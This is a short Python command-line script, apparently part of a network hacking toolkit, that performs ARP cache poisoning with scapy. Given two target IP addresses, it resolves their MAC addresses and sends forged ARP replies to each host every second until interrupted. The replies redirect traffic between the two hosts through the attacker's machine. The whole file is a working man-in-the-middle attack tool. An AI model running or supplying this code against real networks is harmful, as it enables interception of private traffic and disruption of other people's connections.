import click
#from habu.lib.arpoison import arpoison
from scapy.all import arpcachepoison, conf, getmacbyip, Ether, ARP, sendp
#import ipaddress
import time

@click.command()
@click.argument('t1')
@click.argument('t2')
@click.option('-v', 'verbose', is_flag=True, default=False, help='Verbose')
def cmd_arpoison(t1, t2, verbose):
    """ARP cache poison"""

    conf.verb = verbose

    #arpcachepoison(target1, target2, 1)

    mac1 = getmacbyip(t1)
    mac2 = getmacbyip(t2)

    print(mac1)
    print(mac2)

    pkt1 = Ether(dst=mac1)/ARP(op="is-at", psrc=t2, pdst=t1, hwdst=mac1)
    pkt2 = Ether(dst=mac2)/ARP(op="is-at", psrc=t1, pdst=t2, hwdst=mac2)

    try:
        while 1:
            sendp(pkt1)
            sendp(pkt2)
            pkt1.show2()
            pkt2.show2()
            #if conf.verb > 1:
            #    os.write(1,b".")
            time.sleep(1)
    except KeyboardInterrupt:
        pass

if __name__ == '__main__':
    cmd_arpoison()

